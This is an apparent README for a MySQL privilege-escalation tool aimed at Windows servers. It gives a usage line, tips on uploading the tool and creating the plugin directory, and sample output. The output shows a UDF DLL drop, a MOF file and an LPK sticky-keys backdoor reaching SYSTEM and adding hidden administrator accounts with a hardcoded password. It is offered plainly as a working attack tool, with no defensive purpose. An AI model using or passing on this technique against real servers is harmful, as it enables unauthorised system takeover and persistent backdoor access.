# mysql-promoting-privileges
之前写的python打包的

请注意：dll文件只有当服务器是03的时候需要上传
就算是服务器支持外联还是建议把程序传到服务器上运行，因为代码里加了调用os模块创建plugin目录
如果是远程的话 利用NTFS ADS来创建plugin目录，成功的几率比较小
#Usage：
'''root.exe host port user pass'''
#Response:
'''
C:\Users\binghe\Desktop>root.exe 192.168.1.10 3306 root root

 ============================================================================
|                                                                            |
|                BingheSec Mysql Promote Privileges Tool                     |
|                                                                            |
 ============================================================================
Usage as: sec.py host port user pass
Example: sec.py 192.168.1.6 3306 root 123456
Current connection: 192.168.1.10:3306/root/root
Mysql Version is 5.5.40
Mysql Version>5.0 , UDF dll can only dump to plugin dir!
Mysql RootPath : C:/Program Files/phpStudy/MySQL/
UDF DLL PATH : C:/Program Files/phpStudy/MySQL/lib/plugin/BingheSec.dll

UDf will make the user 'guest' active and add to admin with the pass 789456123+abc
The sql of Dumping AddUser And AddToAdmin MOF File has queried OK.
Press shift 5 times then press 1,2 at the same time to start the lpk UI,pass:binghesec
Mof and LPK will add users named BingheSec$/admin$ with password: 789456123+abc
Mof file only fit for windows2003 , please test it byourself!
Command Query Result:
-------------------------------------------------------------------------------

Microsoft Windows [版本 5.2.3790]
nt authority\system
命令成功完成。

命令成功完成。

命令成功完成。

别名 administrators
注释 管理员对计算机/域有不受限制的完全访问权

成员

-------------------------------------------------------------------------------

admin$
Administrator
BingheSec$
Guest
命令成功完成。
'''
